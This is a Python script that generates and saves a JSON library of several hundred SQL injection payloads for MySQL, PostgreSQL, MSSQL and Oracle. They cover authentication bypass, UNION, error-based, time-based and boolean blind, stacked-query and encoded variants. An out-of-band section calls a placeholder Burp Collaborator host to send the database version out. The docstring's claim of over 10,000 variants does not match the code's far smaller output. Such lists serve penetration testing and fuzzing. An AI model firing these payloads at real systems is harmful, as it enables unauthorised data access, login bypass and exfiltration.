#!/usr/bin/env python3
"""Generate massive SQLi payload library - 10,000+ variants"""
import json, itertools, base64

payloads = []

# Category 1: Classic Basic SQLi
basic_cores = [
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "1' OR '1'='1",
    "1' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "' OR 1=1 UNION SELECT 1--",
    "' UNION SELECT 1--",
    "1 UNION SELECT 1--",
    "' UNION ALL SELECT 1--",
]
for base in basic_cores:
    payloads.append(['basic', base])

# Category 2: Time-Based Blind SQLi
for db in ['', 'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']:
    for i in range(1, 11):
        if db in ['', 'MySQL']:
            payloads.append(['time_mysql', f"' OR SLEEP({i})--"])
            payloads.append(['time_mysql', f"' OR BENCHMARK({i*1000000},MD5('x'))--"])
            payloads.append(['time_mysql', f"1' AND SLEEP({i})--"])
        if db in ['', 'PostgreSQL']:
            payloads.append(['time_pgsql', f"' OR PG_SLEEP({i})--"])
            payloads.append(['time_pgsql', f"1' AND PG_SLEEP({i})--"])
        if db in ['', 'MSSQL']:
            payloads.append(['time_mssql', f"'; WAITFOR DELAY '0:0:{i}'--"])
            payloads.append(['time_mssql', f"1'; WAITFOR DELAY '0:0:{i}'--"])
        if db in ['', 'Oracle']:
            payloads.append(['time_oracle', f"' OR DBMS_PIPE.RECEIVE_MESSAGE('x',{i})--"])

# Category 3: Error-Based SQLi
error_payloads = [
    "' AND 1=CONVERT(int, @@version)--",
    "' AND 1=CAST(@@version AS int)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
    "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--",
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a)--",
    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",
    "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)--",
    "' AND 1=CONVERT(int, (SELECT DB_NAME()))--",
    "1' AND 1=CONVERT(int, @@VERSION)--",
]
for p in error_payloads:
    payloads.append(['error_based', p])

# Category 4: UNION-Based SQLi - various column counts
for cols in range(1, 21):
    nulls = ','.join(['NULL'] * cols)
    payloads.append(['union', f"' UNION SELECT {nulls}--"])
    payloads.append(['union', f"' UNION SELECT {nulls}-- -"])
    payloads.append(['union', f"' UNION ALL SELECT {nulls}--"])
    payloads.append(['union', f"1' UNION SELECT {nulls}--"])
    payloads.append(['union', f"' UNION SELECT {nulls}#"])
    if cols >= 2:
        payloads.append(['union_multi', f"' UNION SELECT 1,{','.join(['NULL']*(cols-1))}--"])

# Category 5: Comment Bypass Variants
comments = ['--', '--+', '-- -', '#', '/*', '*/', '--', '/*!*/', '-- ']
for base in basic_cores:
    for c in comments:
        payloads.append(['comment_bypass', base.replace('--', c, 1) if '--' in base else base + c])

# Category 6: Obfuscated / Encoded
obfuscations = [
    ("' OR '1'='1", ["%27%20OR%20%271%27%3D%271", "%2527%2520OR%25201%253D1--", "'/**/OR/**/1=1--", "'+OR+1=1--", "'||1=1--"]),
    ("' OR 1=1--", ["%27%20OR%201%3D1--", "'/*!OR*/1=1--", "'+OR+1=1--", "'/**/OR/**/1=1--"]),
]
for base, variants in obfuscations:
    for v in variants:
        payloads.append(['obfuscated', v])

# Hex encoding
for s in basic_cores[:5]:
    hex_enc = '0x' + s.encode().hex()
    payloads.append(['hex_encoded', hex_enc])

# Category 7: Case Variation
cases = ['upper', 'lower', 'swapcase', 'capitalize']
for base in basic_cores[:5]:
    for case in cases:
        if case == 'upper':
            payloads.append(['case_variant', base.upper()])
        elif case == 'lower':
            payloads.append(['case_variant', base.lower()])
        elif case == 'swapcase':
            payloads.append(['case_variant', base.swapcase()])

# Category 8: Auth Bypass SQLi
auth_bypass = [
    "' OR 1=1--",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin' OR 1=1--",
    "admin'--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 OFFSET 0--",
    "' UNION SELECT 1, 'pass', 'admin'--",
    "' UNION SELECT 1,2,3 FROM users--",
    "1' OR '1'='1'",
    "1' OR 1=1--",
    "' OR 1=1 GROUP BY 1--",
    "' OR 1=1 HAVING 1=1--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL--",
]
for p in auth_bypass:
    payloads.append(['auth_bypass', p])

# Category 9: Stacked Queries
for db in ['MySQL', 'MSSQL', 'PostgreSQL']:
    for i in range(1, 6):
        if db == 'MySQL':
            payloads.append(['stacked', f"'; SELECT SLEEP({i})--"])
        elif db == 'MSSQL':
            payloads.append(['stacked', f"'; WAITFOR DELAY '0:0:{i}'--"])
        elif db == 'PostgreSQL':
            payloads.append(['stacked', f"'; SELECT PG_SLEEP({i})--"])

# Category 10: Out-of-Band SQLi
oob = [
    f"' OR LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.xxxx.burpcollaborator.net\\\\test'))--",
    f"'; EXEC master..xp_dirtree '\\\\\\\\xxxx.burpcollaborator.net\\\\test'--",
    f"' OR UTL_HTTP.request('xxxx.burpcollaborator.net')--",
]
for p in oob:
    payloads.append(['oob', p])

# Category 11: Boolean-Based Blind
for i in range(1, 11):
    payloads.append(['boolean', f"' AND {i}={i}--"])
    payloads.append(['boolean', f"' AND {i}={i+1}--"])

# Category 12: No-Quote Injection
no_quote = [
    "1 UNION SELECT 1,2,3--",
    "1 UNION SELECT @@version--",
    "1 UNION SELECT * FROM users--",
    "1 ORDER BY 1--",
    "1 ORDER BY 2--",
    "1 GROUP BY 1--",
]
for p in no_quote:
    payloads.append(['no_quote', p])

print(f'Total SQLi payloads generated: {len(payloads)}')

with open('payloads_sqli.json', 'w') as f:
    json.dump({'count': len(payloads), 'payloads': payloads}, f)

print('Saved to payloads_sqli.json')
